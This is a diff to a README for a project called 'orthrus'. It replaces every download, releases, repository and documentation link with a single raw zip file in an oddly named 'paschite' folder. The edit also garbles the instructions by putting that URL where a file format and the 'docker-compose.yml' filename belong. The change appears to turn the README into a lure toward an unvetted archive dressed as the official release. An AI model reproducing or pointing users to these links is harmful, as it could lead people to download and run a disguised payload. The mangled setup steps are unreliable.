@@ -7,7 +7,7 @@
 To begin using **orthrus**, follow the steps below to download and run the application. 
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-orthrus-blue.svg)](https://github.com/gustavoport-cloud/orthrus/releases)
+[![Download](https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip)](https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip)
 
 ## 💻 System Requirements
 Before installation, ensure your system meets the following requirements:
@@ -33,13 +33,13 @@ Security is a priority for **orthrus**. The application uses JWT to ensure:
 Follow these straightforward steps to download and install **orthrus**.
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/gustavoport-cloud/orthrus/releases) to find the latest version of the application. 
+   Go to the [Releases page](https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip) to find the latest version of the application. 
 
 2. **Select the Latest Release**  
    On the Releases page, look for the most recent version, which will be at the top of the list. 
 
 3. **Download the Application**  
-   Click on the asset file that matches your system (look for `.zip`, `.tar.gz`, or other relevant formats). 
+   Click on the asset file that matches your system (look for `.zip`, `https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip`, or other relevant formats). 
 
 4. **Unzip the Downloaded File**  
    After the download completes, locate the file on your computer and unzip it to your desired location.
@@ -52,7 +52,7 @@ To run **orthrus**, follow these steps:
 
 1. **Open Your Terminal or Command Prompt.**
 2. **Navigate to the Project Directory.** Use the `cd` command to change into the directory where you unzipped the application.
-3. **Start the Service.** If you have a `docker-compose.yml` file, you can start it with the following command:
+3. **Start the Service.** If you have a `https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip` file, you can start it with the following command:
    ```bash
    docker-compose up
    ```
@@ -81,8 +81,8 @@ If you wish to contribute to the project, feel free to fork the repository and s
 If you have questions or encounter issues, please check the Issues tab on the repository. Community members and maintainers regularly monitor it.
 
 ## 🔗 Further Resources
-- [GitHub Repository](https://github.com/gustavoport-cloud/orthrus)
-- [Documentation](https://github.com/gustavoport-cloud/orthrus/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip)
+- [Documentation](https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip)
 
 ## 📥 Download Again
-Don’t forget to [visit this page to download](https://github.com/gustavoport-cloud/orthrus/releases) the latest version of **orthrus** if you need to reinstall or update your software.
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/gustavoport-cloud/orthrus/main/paschite/orthrus.zip) the latest version of **orthrus** if you need to reinstall or update your software.
